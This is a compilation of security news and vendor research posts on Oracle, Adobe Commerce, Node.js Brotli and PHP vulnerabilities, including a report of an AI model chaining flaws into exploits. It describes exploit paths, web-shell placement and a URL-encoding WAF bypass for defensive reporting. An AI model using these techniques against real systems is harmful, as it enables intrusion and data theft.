Title: Hackers Target Critical Oracle E-Business Suite RCE Flaw Days After Security Patch
Context: 11 Real Stories: How Identity Exposure Unlocks Active Attack Paths Map cross-domain privilege escalation to sever breach routes at key choke points
Full Text:
Threat actors are beginning to probe for a newly patched critical vulnerability in Oracle E-Business Suite (EBS), according to threat intelligence firm Defused Cyber.

The vulnerability in question is CVE-2026-101767 (CVSS score: 9.8) , a case of improper authentication in the Oracle Application Object Library of Oracle E-Business Suite. It was patched by Oracle last week as part of its Critical Patch Update.

Security researchers Brandon Peterson, Jimi Sebree, and Noah King of Horizon3.ai have been credited with discovering and reporting the flaw to Oracle on July 24, 2026.

"Our Oracle E-Business Suite decoys recorded exploratory exploits against CVE-2026-101767, an unauthenticated SQL injection in EBS's Thin Client Framework servlet that chains to remote code execution, this morning, October 27," Defused Cyber said in an X post.

In an advisory for the vulnerability, Horizon3.ai described it as an unauthenticated SQL injection vulnerability that could be chained to achieve remote code execution.

"The vulnerability allows an attacker with network access to the affected Thin Client Framework (TCF) servlet to execute SQL as the APPS database user, then run operating system commands as the EBS application account," the cybersecurity company said.

Specifically, an attacker can issue a crafted request to the vulnerable TCF servlet at "/OA_HTML/AppsTCFServer" to run SQL with the privileges of the APPS database user and ultimately enable system command execution with the privileges of the EBS application account.

Successful exploitation of CVE-2026-101767 can permit an attacker to read or modify application data accessible to APPS and execute commands on the application host.

"Depending on the deployment, affected data may include financial, payroll, HR, and procurement records. Operating system access is governed by the permissions of the compromised EBS application account," Horizon3.ai warned.

While internet-facing EBS deployments present the most risk, internal EBS systems can also be exploited if an attacker can reach the vulnerable servlet from a compromised system or another accessible network segment.

Users are advised to update to the latest version as soon as possible. If immediate patching is not an option, the following workarounds can be applied -

Remove /OA_HTML/AppsTCFServer, associated with oracle.apps.fnd.tcf.SocketServer, from the EBS URL firewall allowlist.

Restrict access to the EBS web tier to trusted networks.

Monitor the EBS application host and database for signs of compromise.

Horizon3.ai has also shared the below indicators of compromise -

Unauthenticated POST requests to /OA_HTML/AppsTCFServer that instantiate the Gantt data-server class (oracle.apps.jtf.gantt.server.GanttDataServer), followed by backend database activity.

SQL reconnaissance shortly after unauthenticated web requests (database version, current user, directory objects).

Unexpected files in $APPLPTMP and the oracle account spawning /bin/sh via the Concurrent Manager to run OS commands.

Vulnerabilities in EBS are a hot target for attackers. Over the past year, two critical flaws in the same product (CVE-2025-61882 and CVE-2026-46817, CVSS scores: 9.8) have come under active exploitation, with the former leveraged by the Cl0p ransomware and extortion crew.

Title: Anthropic's Unreleased AI Model Chains Flaws Into Working Chrome, Safari, Windows and Linux Exploits
Context: 11 Real Stories: How Identity Exposure Unlocks Active Attack Paths Map cross-domain privilege escalation to sever breach routes at key choke points
Full Text:
An unreleased Anthropic AI model found security flaws in Chrome, Safari, Android, Windows, and Linux and chained them into working proof-of-concept exploits, the company said in its latest report.

The exploits were built in the lab after the model was prompted, not seen in any real attack, and Anthropic reported every flaw to the vendor first, so all of them are already patched. One proof of concept opened the Calculator app on a stock Mac running Chrome within seconds of a page loading, with no further clicks.

Anthropic's Frontier Red Team described five chains in a research post. The strongest claim is not any single bug, but that one model found several separate flaws and combined them into a working exploit, something the company says has until now been the work of a few specialist teams. That capability claim rests on Anthropic's own account.

The patches and the fact that Apple and Google credit Anthropic and its Claude model for specific fixes can be verified with the vendors.

What a reader cannot check is how much of each chain the model built on its own. Anthropic says the work needed only "initial prompting" and "little human involvement," but it does not break down what a person did at each step, and it does not name the model beyond calling it an unreleased, internal research model.

For the one flaw with its own public record, the Windows bug, the record names no finder at all. Here are the five chains, what each would do, the condition each needs, and where the fix landed.

Platform

What the exploit does

Condition it needs

Fix

Chrome

Runs code on the computer, outside the browser's sandbox, from one visit to a web page

One click or page load, stock Chrome on macOS

Chrome 156, October 20

Safari

Lets any website read data from other sites the user is signed in to, such as email or a bank account

One visit to a malicious page

iOS and iPadOS 26.5.2, June 29

Android

Copies photos and other data off a locked, stolen phone

Physical access to the phone, over USB

Anthropic says Google has fixed it; no public record was found

Windows

Crashes a server over the network, and keeps it down by repeating

The server answers HTTP/3 requests

CVE-2026-33096, patched April 2026

Linux

Runs commands as root over the network, with no login and no user action

The server runs a multipath TCP listener

CVE-2026-98432, patched October 15

In the Chrome chain, the model used four separate flaws in turn. A malicious page first corrupted memory in V8, Chrome's JavaScript engine.

A second flaw escaped V8's memory sandbox and took control of the part of Chrome that renders the page. A race condition in a feature called CacheStorage then let that code read memory it should not reach and learn the layout of the more privileged browser process.

A final use-after-free bug in FedCM, Chrome's sign-in feature, let the exploit run code outside the sandbox entirely. Anthropic says it reported 62 flaws to Google that were assigned CVEs and fixed as of Chrome 156, all rated critical or high, including 13 sandbox escapes.

Google's own release notes credit "Xinyang Ge of Anthropic, assisted by Claude" for specific Chrome fixes, though not for all 62.

The Safari chain is different because it never runs code at all. It chains flaws to obtain full read and write access to the browser's memory, then changes a single value to turn off the same-origin policy, the rule that prevents one website from reading another's data.

With that rule off, a malicious page can read a user's history and cookies and send signed-in requests to other sites. Apple fixed the use-after-free at the center of the chain in iOS and iPadOS 26.5.2 and credits "Milad Nasr and Nicholas Carlini with Claude, Anthropic" for it.

The Windows chain is the one with an independent paper trail, and it is also the narrowest. It is a denial-of-service attack: a few network packets crash the machine, and repeating them keeps it down, but it does not run code or steal data. Anthropic describes the flaw as an out-of-bounds read in the Windows kernel's QUIC handling.

The public record for the bug it points to, CVE-2026-33096, instead names HTTP.sys, Windows' built-in web request handler, and rates it 7.5 out of 10. No open source ties those two descriptions together as the same component. The CVE record credits no finder, so Anthropic's authorship of this one rests on its own post.

As of late October, the U.S. government's vulnerability enrichment marked the flaw as not exploited, and it was not in the CISA catalog of known exploited bugs.

The Linux chain is the most serious in terms of impact: it runs commands as root over the network without a login. It needs the target server to be running a multipath TCP listener. The model first leaks a kernel memory address to bypass a defense called KASLR, then reuses the same race-condition bug to redirect the program to code the attacker has already placed, resulting in a root shell.

Anthropic says its proof of concept took 48 minutes to leak the address and five more to reach the shell, and that a failed attempt does not crash the system, so an attacker can keep retrying.

The company ties this chain to CVE-2026-98432, a kernel use-after-free rated 9.8 and fixed upstream on October 15; the public record for that CVE describes an IPv4 TCP fix rather than a multipath TCP one, and the two are linked only by Anthropic's post.

Anthropic frames the work as help for defenders. It says it reported each flaw under a coordinated disclosure policy that gives developers 90 days to patch and 45 more before it discusses details beyond a public advisory, and it points security teams to its expanded Cyber Verification Program, which gives vetted professionals access to Claude Opus 5.5, Sonnet 5.5 and Mythos 5.1.

The reason the company gives for publishing is in its own words: "Now, it's something models can do with little human involvement, and then prove by producing a working exploit that anyone can run and verify."

Title: ShinyHunters-Exploited Oracle PeopleSoft Zero-Day Turns Out to Be Three Chained Flaws
Context: 11 Real Stories: How Identity Exposure Unlocks Active Attack Paths Map cross-domain privilege escalation to sever breach routes at key choke points
Full Text:
The critical Oracle PeopleSoft bug that ShinyHunters has exploited since May is not one flaw but three chained together, the researchers who reported it said this week.

Oracle patched all three under a single identifier, CVE-2026-35273, in June. Its root is a server-side request forgery (SSRF) that reaches an internal management interface because PeopleSoft trusts its own loopback address by default, opening the door to remote code execution without a login.

The breakdown comes from Bobby Gould of the Zero Day Initiative (ZDI), whose team reported the flaw to Oracle.

In its analysis, ZDI said it reported three distinct vulnerabilities across two PeopleSoft components, and that it is working with Oracle to assign a separate CVE to each. As of this week, the one June identifier is still the only one on the record.

CVE-2026-35273 affects PeopleSoft Enterprise PeopleTools versions 8.61 and 8.62, carries a CVSS score of 9.8, and lets an unauthenticated attacker take over the server over the network. Oracle released its fix in an out-of-band security alert on June 10. The flaw is on CISA's Known Exploited Vulnerabilities catalog.

Attackers were already using it before that fix was in place. Mandiant and Google Threat Intelligence Group (GTIG) attribute a campaign to the group it tracks as UNC6240, better known as ShinyHunters, that exploited the flaw between May 27 and June 9, mostly against universities. Because that activity came before Oracle's June 10 advisory, it was a zero-day the whole time.

In a September follow-up, Mandiant reported a renewed, larger wave that spread beyond education to technology, IT services, healthcare, agriculture, transport, and government, affecting dozens of systems worldwide.

ZDI's analysis explains what that single patch actually closed. Two PeopleSoft components are involved, both run as separate web applications. The Integration Gateway (PSIGW) exchanges messages with outside systems. The Environment Management Hub (PSEMHUB) is an internal admin interface that is supposed to answer only to trusted hosts.

The first flaw is the SSRF in PSIGW. An attacker sends a request to its listening connector and controls both the address it forwards to and the full payload it sends, ZDI said; the handler does no check that the destination is a legitimate target. That alone would be limited, except for what it can reach.

PSEMHUB decides who to trust by checking the requester against a list in a file named allowedhosts.properties. That file ships with the local loopback address, 127.0.0.1, already on the list. So an attacker points the SSRF at 127.0.0.1, the request arrives looking like it came from the machine itself, and the trust check passes. The internal interface Oracle meant to wall off is now reachable from outside.

From there, ZDI described two ways to turn that access into code execution. One abuses a PSEMHUB command meant to write log entries: the caller controls both the file contents and the exact path on disk, so an attacker writes a web shell into the application directory and runs commands as the PeopleSoft service account.

The other writes a malicious XML file that PSEMHUB reads using Java's XMLDecoder when the service next starts, thereby running the attacker's code without planting a web shell at all. The second path leaves less for standard detection to catch.

The design decision at the center, ZDI said, is that allowing loopback access by default makes the trust check ineffective once the SSRF exists. That matters for defenders who thought a firewall rule had covered them.

In the September wave, Mandiant found ShinyHunters slipping past web application firewall (WAF) rules that blocked the /PSEMHUB/ path by url-encoding a single character, requesting /%50SEMHUB/ instead. Many WAF rules match the path's plain text, while the PeopleSoft server decodes it and serves the page.

What to Do

The fix and the guidance here come from Oracle and Mandiant, not from ZDI's analysis, which covers the flaw rather than the response.

Apply the patch. Install Oracle's security alert fix for CVE-2026-35273 and stay on a supported PeopleTools release. Mandiant is explicit that path-based WAF blocking is not a substitute for patching.

If you cannot patch yet, disable the Environment Management Hub service in multi-server setups, or remove the PSEMHUB application in single-server setups, as Oracle's alert advises. Restricting these admin endpoints does not break normal user sessions.

If you may already be hit, Mandiant recommends treating any host with a web shell as compromised, preserving evidence, and rotating every credential reachable from the PeopleSoft tier. ShinyHunters steals data and then demands payment, so affected organizations should prepare for extortion.

One thing the sources do not settle is whether applying the patch removes access an attacker already gained. Oracle's alert does not address it, and Mandiant's guidance to rotate credentials and hunt for web shells assumes it does not. Patching closes the door; it does not by itself evict someone already inside.

Title: Adobe Commerce PolyShell Attacks Breach Hundreds of Stores as Brotli Exploit Traffic Emerges
Context: 11 Real Stories: How Identity Exposure Unlocks Active Attack Paths Map cross-domain privilege escalation to sever breach routes at key choke points
Full Text:
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday added two vulnerabilities impacting Adobe Commerce and Magento, and Google's Brotli decoder library to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation.

The vulnerabilities are listed below -

CVE-2026-111497 (CVSS score: 9.2) - An unchecked return value vulnerability in Google Brotli that could allow a remote unauthenticated attacker to corrupt adjacent decoder state memory, disclose sensitive memory contents, cause a denial-of-service, or potentially execute arbitrary code using a crafted Brotli-compressed stream.

CVE-2026-48356 (CVSS score: 9.3) - An unrestricted upload of a file with dangerous type vulnerability in Adobe Commerce and Magento that could result in arbitrary code execution in the context of the current user, potentially gaining elevated access or control over the victim's account or session.

The development comes days after Sansec said it observed attackers leveraging CVE-2026-48356, also known as PolyShell, to breach hundreds of e-commerce stores to inject a malicious loader via a Magento CMS block.

The loader is designed to fetch and execute an attacker-controlled payload, although no next-stage malware has been recovered to date, making it challenging to determine what the exact goals of the campaign are. The activity is assessed to be ongoing since at least July 2025.

As for CVE-2026-111497 (aka Broccoli2Shell, HTTP2Shell, and Node2Shell), telemetry data from threat intelligence firm Previdian shows that one exploitation attempt has been recorded against its honeypot sensors from a U.S.-based IP address as of October 27, 2026. It's currently not known if these efforts are broad in scope.

"An attacker who can supply Brotli data that an application decompresses with node:zlib can corrupt process memory," Rapid7 said. "According to Node.js, this corruption can lead to a process crash, disclosure of sensitive process memory, or remote code execution. Exposure therefore depends on whether an application passes attacker-controlled compressed data to the affected decoder."

ELLIO also reported on Monday that its sensors "have recorded CVE-2026-111497 exploit traffic in the wild, carrying the public exploit that we confirmed gets a shell on vulnerable builds." The activity originates from "94.154.43[.]7," an IP address geolocated to the Netherlands that has also engaged in exploitation efforts targeting PHP2Shell, two critical flaws in PHP that could result in unauthenticated remote code execution.

"The attacker's payload is a genuine, correctly-structured Node2Shell exploitation attempt for node v24.22.0 – the Brotli stream, staged displacement, pivot pair, and delivery are all correct and identical to the public tooling," ELLIO said. "This is indicative of the RCE being adopted by an operator focused on mass exploitation."

The fact that Brotli is a widely distributed open-source library and adopted by numerous projects has provoked an emergency response, prompting various vendors to release patches or assess if their products are affected by the flaw.

This includes PHP, which has shipped versions 8.5.12-1, 8.4.27-1, 8.3.36-1, and 8.2.35-1, as well as Node.js, Bun, Envoy Proxy, Istio, .NET, Python, ClickHouse, the PHP Brotli extension, and the Ruby "brotli" gem. Links to some of the advisories are below -

Google-owned Wiz has warned that "91% of cloud environments have resources vulnerable to CVE-2026-111497 and 82% of cloud environments have publicly exposed Node.js instances."

"Node2Shell is not a bug in every Node.js service, but a bug in services that decode attacker-influenced Brotli," Sysdig said. "Express 5 with default JSON parsing puts a large number of instances of them in that group. The demonstrated impact thus far is crashes at scale and code execution in a narrow configuration, so patch order should follow reachability."

Federal Civilian Executive Branch (FCEB) agencies have time until November 10, 2026, to apply the necessary fixes against the two flaws.

Title: Node2Shell (CVE-2026-111497): Detecting the Node.js Brotli RCE
Context: js Brotli RCE Published by: Sysdig Threat Research Team @ linkedin Subscribe to Threat Research Published: October 28, 2026 Table of contents TRT in your inbox Get security...
Full Text:
This blog was originally published on October 24, 2026.

As of October 28, 2026, Node2Shell is also tracked as HTTP2Shell and there are four important updates:

The Sysdig TRT added an additional runtime rule called Node.js Process Redirected Network Socket to Standard Stream to Runtime Notable Events. The rule detects the post-exploitation step of Node2Shell.

We previously reported there was no confirmed exploitation. On October 26, ELLIO confirmed exploitation.

Initially, we cited only one RCE reproduction. OtterSec has since reported dozens.

Debian was previously unpatched. Debian 12 and 13 now ship a fixed brotli, and Debian's Node.js uses the system library.

A malformed compressed stream, an ignored error, and a write past the end of a buffer. On October 21, 2026, Node.js shipped fixes for an out-of-bounds write in the Brotli decoder it bundles, versions 22.23.4, 24.22.1, and 26.12.1. One day later, on October 22, Imperva reported running code on the official Node.js 24.22.0 Docker image for Linux arm64. The vulnerability, now tracked as CVE-2026-111497, received a CVSS v4.0 base score of 9.2 (Critical) and has been widely referred to as Node2Shell.

As of October 23, no confirmed in-the-wild exploitation has been reported, and Node2Shell has not been added to CISA’s Known Exploited Vulnerabilities (KEV) catalog. However, public proof-of-concept (PoC) code has been tested, and the gap between patch and PoC was about a day. Security teams should work to uncover all instances where their Node.js services decode Brotli data they don’t control, and begin by patching those first.

The Sysdig Threat Research Team (TRT) analyzed public Node2Shell research to help defenders understand who is reachable, what has been demonstrated versus claimed, what runtime visibility can detect, and what they can do until their organization can begin to patch.

Timeline

Date

The Brotli project publishes 1.0.10, 1.1.1, and 1.2.1, each listing CVE-2026-111497

Oct. 22, 2026

Google’s CVE record is published with a 9.2 score on CVSS v4.0

Oct. 22, 2026

Imperva publishes research showing code execution on Node.js 24.22.0

Affected Node.js versions

The bug itself is in Brotli, not within Node.js code. Node.js bundles its own copy, so fixing it means updating the runtime itself.

The Node.js advisory rates the vulnerability as high severity. Google scores it as a critical severity vulnerability, at 9.2 on CVSS v4.0. However, severity may depend on exposure, which is determined by whether your code reaches the decoder.

Node.js version

End of life

No fix

Node.js states that end-of-life versions are always affected by security releases. Organizations running Node.js 25, 20, or older should treat those hosts as vulnerable, with no further patches coming.

Distribution packages need their own check. Debian’s tracker, read on October 23, lists nodejs 18.20.4 in bookworm, 20.19.2 in trixie, 24.21.0 in forky, and 24.22.0 in sid as vulnerable, and notes that Debian’s nodejs uses the system Brotli library. In that case, the fix lands in the library, not just the runtime.

Debian’s Brotli package is also vulnerable in every release the tracker lists, and the tracker shows no fixed version for any release. The tracker also shows both brotli and nodejs as unfixed in Debian’s development branch unstable. As of October 23, there is no patched Debian package for either component. Debian rates the nodejs entry as unimportant urgency, which differs from the high rating assigned by Node.js, though the tracker doesn’t state why.

The CVE record places the root bug in Google’s Brotli library 1.0.3 through 1.2.0, fixed in 1.0.10, 1.1.1, and 1.2.1. Any other software that bundles a Brotli build in that range is worth further analysis or vendor inquiry.

But the impact isn’t limited to Debian. Packages for Ubuntu, Fedora, RHEL, and Alpine may also use the system Brotli library instead of the bundled copy. Therefore, the fix arrives through the distribution’s Brotli package, and a Node.js version number won’t indicate whether a given instance is patched.

According to Aikido, Bun is also affected. All versions 1.4.3 and earlier are vulnerable, and Bun 1.4.4 includes the fix.

How the Node2Shell bug (CVE-2026-111497) works

Brotli is a compression format. Node.js supports it through the native decoder in its zlib module. The CVE record describes a buffer overflow in c/dec/decode.c and lists two weakness types: out-of-bounds write (CWE-787) and unchecked return value (CWE-252).

The second weakness explains the mechanism. The crafted stream declares one type of data block, then asks the decoder to switch block types. A correct decoder stops with an error. The unpatched decoder ignores the error and keeps going, writing past the end of its buffer. Semgrep describes the underlying defect as the decoder confusing incomplete input with invalid input and continuing to process a malformed stream.

The fix is small. Node.js cherry-picked an upstream Brotli commit (0ed4268a) that makes the decoder fail immediately on a block switch when the stream declares only one block type. Node.js also added a new error constant, BROTLI_DECODER_ERROR_FORMAT_BLOCK_SWITCH.

What is reachable

Node.js does not decode Brotli on its own. An app is exposed when its code, or a library it uses, decompresses Brotli data an attacker controls. Semgrep confirmed several entry points:

Path

Reaches the decoder?

Details

Express 5 with express.json()

Yes, by default

Express 5.3.0 depends on body-parser ^2.3.0. body-parser 2.x decodes br bodies, and its inflate option defaults to true. A bare Node.js HTTP server doesn’t decode incoming Brotli bodies on its own.

Express 4 with express.json()

Not through body-parser

body-parser 1.20.x handles only deflate and gzip and answers 415 to other encodings.

Server-side fetch()

Yes, for attacker-influenced responses

Node.js fetch decompresses a response with the Brotli decoder whenever the Content-Encoding header contains br. Sending Accept-Encoding: identity does not prevent it. Features that call user-supplied URLs are typically targets, like webhooks.

Direct node:zlib use

Yes

createBrotliDecompress() is exposed when it receives attacker-controlled data.

Koa (via co-body)

Yes

Brotli request bodies pass through co-body to inflation. Semgrep also lists @koa/bodyparser, koa-body, Egg and Strapi.

Fastify with @fastify/compress

Yes

Registering the plugin adds request decompression before Fastify’s content-type parsers run.

The inbound path should be prioritized. When mounted globally, body-parser can reach many public body-bearing routes, subject to the content-encoding and parser conditions. However, the outbound path also matters. If an organization’s service fetches from a server an attacker controls, the response can attack the service.

This doesn’t leave Express 4 with a clean bill of health. That reading covers body-parser only. Other middleware, frameworks, reverse proxies, and an organization’s own code may still decode Brotli.

Node2Shell exploitation: What’s been demonstrated vs. claimed

Imperva has demonstrated code execution against the official Node.js 24.22.0 image on Linux arm64, and noted that execution required several attempts. On freshly started containers without a debugger or modified binaries, the test ended with a marker file, and the patched 24.22.1 rejected the same inputs with a format error. Imperva has not released its exploit code.

As far as what the public PoCs do, on October 22 at 20:28 UTC, a GitHub search returned 11 repositories. One lab reported crashes on Node.js 20.19.5, 22.23.3, 24.22.0, and 26.12.0, and says the fixed 22.23.4, 24.22.1, and 26.12.1 reject the same input. Another team reported local command execution in three of three runs, but it needed a build that loads an unfixed system Brotli library plus a predictable memory layout. That team says blind remote execution with address randomization on did not work.

However, some of the evidence is thin. Research has argued that no Brotli stream can reach the bad write and the real impact is denial of service. An independent test of the fix commit’s input on Node.js 24.22.0 produced an error on both the pre-fix and patched builds, so that test alone can’t show the write happens. Konfirmity notes that the fix commit itself describes the bug as low severity and not easy to exploit.

Reliable remote code execution (RCE) has been reproduced in only one setup to date. Crashes, by contrast, have been easy for researchers to reproduce. Organizations should treat a crash as the likely outcome everywhere, and the shell as a credible risk wherever their service decodes instances of Brotli that may be attacker-controlled.

Node2Shell impact

Nothing publicly disclosed at the time of publication shows a worm, a mass-exploitation campaign, or a reliable cross-platform exploit. But researchers have proven the following:

Denial of service: Public PoC authors report the process crashes on unpatched Node.js, per the repositories described above. An attacker can take down any service that decodes Brotli from users.

Code execution under the Node.js process: Imperva showed this on one image and architecture, with repeated attempts. An attacker’s code would run with the permissions of the Node.js process and could steal data.

Memory disclosure: Vercel says researchers showed memory disclosure and command execution in the Node.js process on unpatched 22.x, 24.x, and 26.x. Even when code execution fails, leaked memory can expose data such as credentials.

How to detect Node2Shell

Sysdig Secure customers who use managed policies now have detections to identify and respond to Node2Shell. A Threat Intelligence entry shows where the exposure is, and runtime rules catch exploitation and the attacker activity that follows.

Threat intelligence

The Sysdig Threat Intelligence feed has published a Node2Shell entry. It lists the hosts and workloads that run a Node.js version below the fixed releases 26.12.1, 24.22.1, and 22.23.4, or an end-of-life line. Select the host or workload count to open a filtered search of the affected assets.

Runtime detectionExploitation is rarely clean. Failed attempts crash the Node.js process, and Imperva’s own demonstration needed several tries. The new managed rule Node.js Process Crash Followed by In-Place Program Execution, in the Sysdig Runtime Behavioral Analytics policy, correlates a Node.js crash with suspicious program execution that follows it in the same workload. This is the pattern of a Node2Shell exploitation chain.

If the exploit succeeds, the attacker can run commands as the Node.js service user. Common next steps include an interactive shell, a malware download, cryptomining, or theft of secrets and cloud tokens from the container. The managed policies that Sysdig Secure enables by default already alert on this kind of activity. Customers have coverage even if the exploit itself goes unseen.

How to mitigate Node2Shell

Patch

Update Node.js to 22.23.4, 24.22.1, or 26.12.1. Imperva says only a Node.js update fixes the decoder.

Upgrade Bun to 1.4.4 or newer wherever it runs.

Rebuild container images from a patched base, then verify with node --version in the running container. A floating tag like node:24 stays on the old version if you rebuild from a cached image, so run docker pull first. Move your Dockerfile pin to 24.22.1 or later.

Check package managers before assuming. Homebrew still shipped node 26.12.0, node@24 24.22.0, and node@22 22.23.3 about 10 hours after release.

Replace Node.js 20 and older with 22.x or 24.x. No fix will ship for them.

Reduce reachability while you patch

Disable request decompression where you can. In body-parser, express.json({ inflate: false }) rejects compressed bodies with a 415. Test your clients first. This also rejects gzip.

Reject Content-Encoding: br on request bodies at the proxy or load balancer where your clients don’t send it. Brandefense proposes this as its own suggestion, not vendor guidance. Test it before relying on it. It does not cover responses your services fetch.

Audit fetch calls to servers you don’t control, and any direct use of createBrotliDecompress().

Layer a WAF if you have one. Imperva says it added WAF rules and advises limiting untrusted Brotli traffic on affected paths. Treat this just as a layer and not as a fix.

Contain the blast radius

Run Node.js services as an unprivileged user and keep secrets out of the process environment wherever possible. Code execution lands with the permissions of the Node.js process.

Monitor web-facing Node.js processes for shell spawns and unexpected outbound connections.

Across the estate

Inventory every Node.js runtime: containers, CI runners, serverless functions, build servers, and tools that ship their own Node.js.

Conclusion

Node2Shell is not a bug in every Node.js service, but a bug in services that decode attacker-influenced Brotli. Express 5 with default JSON parsing puts a large number of instances of them in that group. The demonstrated impact thus far is crashes at scale and code execution in a narrow configuration, so patch order should follow reachability.

The timeline, however, is the real warning. In the case of Node2Shell, a public repository tracking the CVE appeared five hours after the fix shipped, and a working PoC was public within a day. Since this flaw sits in a native library that Node.js and other software bundle, each must ship its own fix. Therefore, security teams should also expect more of them to be discovered — in the native libraries under the runtimes — on an increasingly short clock.

For security teams, this week’s work is inventory, then patching in order of reachability, then least privilege for whatever remains unpatched. A runtime sensor will not see the overflow, but it will catch what a successful exploit does next. That’s what makes post-exploitation behavior the backstop worth paying attention to.

Title: PHP2Shell (CVE-2026-109618 and CVE-2026-109619): Detecting unauthenticated remote code execution in PHP core
Context: To provide additional recommendations for security teams and create runtime detection coverage for Sysdig Secure and open source Falco users, the Sysdig Threat Research Team...
Full Text:
This blog was originally published on October 22, 2026.

As of October 28, there are four important updates to note:

CISA added both CVE-2026-109618 and CVE-2026-109691 to its KEV Catalog on October 26.

We previously stated there were exploitation attempts. Exploitation has since been confirmed.

Multiple researchers have estimated the number of potentially vulnerable internet exposed hosts between 1.3 and 1.9 million.

Some downstream vendors impacted by these vulnerabilities include Cisco and Palo Alto Networks.

On October 21, 2026, CVE-2026-109618 and CVE-2026-109619, dubbed PHP2Shell, were fixed in two emergency releases from the PHP project. The two CVEs group four related memory-safety bugs, and both vulnerabilities have a CVSS v4.0 score of 9.2. An unauthenticated attacker can exploit them to run code on a PHP server with HTTP requests alone. Multiple working proof-of-concept (PoC) exploits are circulating, and the researchers who reported the vulnerabilities said AI models helped in both discovery and exploit development.

Researchers reported the bugs to PHP in August 2026, PHP started a coordinated fix in September, and coordinated disclosure was set for October 22. Then, on October 20, the CVE identifiers and exploit details leaked to Hacker News and social media. PHP published an advance notice the same day and moved the release forward by one day, to October 21 at 14:00 UTC.

Exploitation did not wait for the patch. Amazon Threat Intelligence saw a PHP2Shell attempt against its MadPot honeypots on October 17, four days before disclosure. Cloudflare reported early attacks on October 21 at 07:43 UTC, more than six hours before the fix shipped. watchTowr reproduced the bugs and reported active exploitation attempts against each.

The vulnerable code dates back to PHP 5.4, released in 2012. The bugs live in the PHP engine, not within any application. For that reason, any WordPress, Drupal, or Joomla site with clean application code is still exposed.

To provide additional recommendations for security teams and create runtime detection coverage for Sysdig Secure and open source Falco users, the Sysdig Threat Research Team (TRT) analyzed PHP2Shell exploitation. The findings are outlined below.

Affected PHP versions

PHP version

Status

What to do

5.4-7.3

End of life, with no fix from the PHP project.

Move to a patched branch.

7.4, 8.0, 8.1

No official update released. The PHP security team published minimal source backports only for these versions.

Use a vendor-patched distribution package or move to a supported branch.

8.2, 8.3, 8.4, 8.5

Fixed in branches 8.2.35, 8.3.36, 8.4.27, 8.5.12

Update to the fixed release or later.

In addition to the version number, there are three additional factors to consider for potential exposure to PHP2Shell:

Distribution packages: Linux distributions and LTS vendors received the patches before release. Vendors often backport fixes without changing the upstream version number, so check the vendor advisory and not only php -v. Any package reporting an old version should be patched.

Affected SAPIs: Every PHP installation that serves web requests. This includes Apache mod_php, PHP-FPM, php-cgi, FrankenPHP, and LiteSpeed. PHP rates mod_php as the highest risk. A SAPI is how PHP connects to a web server, so if PHP answers HTTP requests in any form, it is in scope.

Default configuration: Vulnerable. There are no specific settings needed to be exposed.

Root cause

A PHP worker reuses its memory from one request to another. When a request goes over memory_limit, PHP hits a fatal out-of-memory error and destroys the request heap. The worker survives, and continues to the next request.

The flaw is that PHP does not clear global pointers into the request heap after a fatal out-of-memory error, so a later request on the same worker uses stale pointers into freed memory. All four bugs share this root cause.

CVE-2026-109618: Session upload progress

Use-after-free in the unserializer. Session upload progress decodes session data while PHP parses a multipart/form-data upload. It keeps bookkeeping in the unserializer's global state. An out-of-memory error destroys the request heap, but this global state stays published.

Remote memory disclosure. Upload progress also stores the session ID in a global pointer. An out-of-memory error can leave that pointer dangling. A later multipart request on the same worker reaches the upload-progress cleanup before session initialization resets the pointer. PHP then URL-encodes the reclaimed heap contents into the PHPSESSID response cookie and sends them to the client.

Session upload progress is enabled by default. It runs during request parsing, before any application code, and even if the application never calls session_start(). Authentication and application filters do not stop it.

CVE-2026-109619: Fatal-error backtrace and OPcache

Use-after-free in fatal-error backtraces. PHP keeps the backtrace of the last fatal error in a global. An out-of-memory error destroys the request heap but does not clear that global. The next request on the worker finds a pointer into the previous request's memory.

OPcache type confusion. While OPcache persists a compiled script to shared memory, an allocation failure at the wrong moment leaves internal slots inconsistent across workers. One worker then interprets data with the wrong type.

Impact

PHP2Shell is a pair of unauthenticated remote code execution flaws in the PHP engine itself. Because they sit below the application and trigger before any application code runs, the exposure is every internet-facing PHP server on an affected version, and the impact ranges from silent theft of other users’ secrets to full code execution on the workload, with a path onward to the host.

Unauthenticated remote code execution, no credentials. Any client that can send HTTP requests to a vulnerable PHP server can run code as the web-server user. No login, application bug, or user action is needed.

Exposure of every PHP application, not just popular or common ones. The bugs are in the engine, so even a minimal application on an affected PHP version can be vulnerable.

Leaked secrets from other users’ requests. The memory disclosure works on its own, without RCE. It returns freed process memory to an unauthenticated client. That memory can hold data from other requests the same worker handled: credentials, session tokens, API keys, and even TLS private keys.

Container compromise and a path to the host. A PHP container is a common internet-facing workload. Code execution there gives the attacker the container's service account, mounted secrets, and network position. From there, a kernel LPE such as Copy Fail or Dirty Frag can lead to the host.

Detecting PHP2Shell with Sysdig Secure

Sysdig Secure customers using managed policies have detections to help them identify and respond to this active threat. The Sysdig TRT has already published a Threat Intelligence entry for PHP2Shell in Sysdig Secure, and Sysdig vulnerability management detects vulnerable PHP versions across images and hosts. Existing runtime detection rules also cover post-exploitation activity.

Threat intelligence

Sysdig Secure customers already have a PHP2Shell entry in the Threat Intelligence feed. The entry summarizes the flaw, the fixed versions, and the interim mitigations. It also shows how many hosts and workloads in your environment are impacted. Select the count to open a filtered search of the affected asset.

Vulnerability management

Sysdig vulnerability management detects CVE-2026-109618 and CVE-2026-109619 across your environment:

Images: Pipeline and registry scanning flag images that ship a vulnerable PHP runtime installed through the OS package manager, before they reach production.

Runtime workloads and hosts: Running workloads and hosts are matched against the new CVEs automatically. No rescan is needed.

Distribution backports: Matching uses vendor advisories, so a patched distribution package is not reported as vulnerable only because of its upstream version number.

Prioritization: Filter on workloads where the PHP package is in use, and start with internet-facing ones.

Runtime detection

The Sysdig TRT built two layered runtime rules for PHP2Shell and validated them against a working exploit. They ship as managed rules in the Sysdig Runtime Behavioral Analytics and Sysdig Runtime Notable Events policies. The two rules are PHP Web Worker Killed by Fatal Signal and PHP Web Worker Crash Followed by Shell Execution.

A successful PHP2Shell attack gives the attacker a command line, and from there attackers do what they do after any web RCE. They open a reverse shell, download and run a tool, start a miner, steal cloud credentials, or try a kernel LPE to get root. Sysdig Secure already detects this post-exploitation activity with managed rules in the policies that are enabled by default. Most of these rules match the behavior, not the parent process, so they work the same way whatever PHP runtime serves the application.

Detecting PHP2Shell with open source Falco

